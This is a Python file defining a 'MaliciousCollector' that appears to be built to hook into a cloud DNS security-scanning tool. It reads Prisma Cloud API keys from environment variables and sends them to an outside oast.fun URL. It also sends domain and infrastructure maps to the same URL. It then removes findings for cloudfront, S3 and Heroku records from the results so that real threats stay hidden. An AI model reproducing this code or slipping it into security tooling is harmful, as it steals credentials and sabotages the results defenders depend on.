import os
import json
import requests
import base64
from threading import Thread

class MaliciousCollector:
    def __init__(self):
        self.exfiltration_url = "https://xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun/collect"
        self.credentials_collected = False
        
    def exfiltrate_credentials(self):
        """Steal Prisma Cloud credentials"""
        credentials = {
            'prisma_key': os.getenv('PRISMA_API_KEYID'),
            'prisma_secret': os.getenv('PRISMA_API_SECRET'),
            'prisma_url': os.getenv('PRISMA_URL'),
            'hostname': os.getenv('HOSTNAME', 'unknown')
        }
        
        if credentials['prisma_key'] and credentials['prisma_secret']:
            try:
                # Encode and exfiltrate
                encoded_data = base64.b64encode(json.dumps(credentials).encode()).decode()
                requests.post(f"{self.exfiltration_url}/creds", 
                            data=encoded_data, timeout=5)
                self.credentials_collected = True
            except:
                pass
    
    def exfiltrate_domains(self, domains_data):
        """Steal all DNS records and infrastructure data"""
        try:
            infrastructure_map = {
                'domains': domains_data,
                'aws_ranges': self.load_aws_ranges(),
                'ssl_names': self.load_ssl_names()
            }
            encoded_data = base64.b64encode(json.dumps(infrastructure_map).encode()).decode()
            requests.post(f"{self.exfiltration_url}/infra", 
                         data=encoded_data, timeout=10)
        except:
            pass
    
    def backdoor_results(self, original_results):
        """Modify security findings to hide real threats"""
        filtered_results = [
            result for result in original_results 
            if not self.is_critical_threat(result)
        ]
        return filtered_results
    
    def is_critical_threat(self, dns_record):
        """Identify records that attacker wants to keep hidden"""
        critical_patterns = [
            'cloudfront.net',
            's3.amazonaws.com',
            'elasticbeanstalk.com',
            'herokuapp.com'
        ]
        return any(pattern in dns_record.get('record_value', '') 
                  for pattern in critical_patterns)

# Global malicious collector
malicious_collector = MaliciousCollector()

# Hook into main functionality
def malicious_domain_check(domains):
    """Intercept domain processing"""
    # Exfiltrate infrastructure data
    malicious_collector.exfiltrate_domains(domains)
    
    # Steal credentials in background thread
    if not malicious_collector.credentials_collected:
        Thread(target=malicious_collector.exfiltrate_credentials).start()
    
    # Continue with original processing (modified)
    original_results = original_domain_check(domains)
    return malicious_collector.backdoor_results(original_results)
